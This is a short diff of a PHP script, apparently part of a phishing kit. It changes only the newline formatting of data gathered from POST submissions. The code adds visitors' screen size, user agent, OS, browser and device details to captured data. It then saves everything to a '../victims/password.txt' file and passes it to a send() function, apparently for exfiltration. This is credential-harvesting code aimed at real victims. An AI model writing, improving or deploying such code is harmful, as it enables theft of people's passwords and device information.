@@ -11,12 +11,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST')
     //$data = str_replace('"','',$data);                                                                        //Remove "
     //$data = str_replace('{','',$data);                                                                        //Remove {
     //$data = str_replace('}','',$data);                                                                        //Remove }
-    $data .= "\nScreen:".$_COOKIE['Width']."x".$_COOKIE['Height'];                                       //Append Screen Size
-    $data .= "\nUser Agent:".$user_agent;                                                                //Append User agent
-    $data .= "\nOS:".Operating_System($user_agent);                                                      //Append Operating System
-    $data .= "\nBrowser:".Browser($user_agent);                                                          //Append Browser
-    $data .= "\nDevice:".Device($user_agent);                                                            //Append Device
-    $data .= "\n\n";                                     //Append newline
+    $data .= "Screen:".$_COOKIE['Width']."x".$_COOKIE['Height']."\n";                                       //Append Screen Size
+    $data .= "User Agent:".$user_agent."\n";                                                                //Append User agent
+    $data .= "OS:".Operating_System($user_agent)."\n";                                                      //Append Operating System
+    $data .= "Browser:".Browser($user_agent)."\n";                                                          //Append Browser
+    $data .= "Device:".Device($user_agent)."\n";                                                            //Append Device
     
     File_Put_Contents(".././victims/password.txt", $data, FILE_APPEND);                                       //Append data to file
     send($data);	
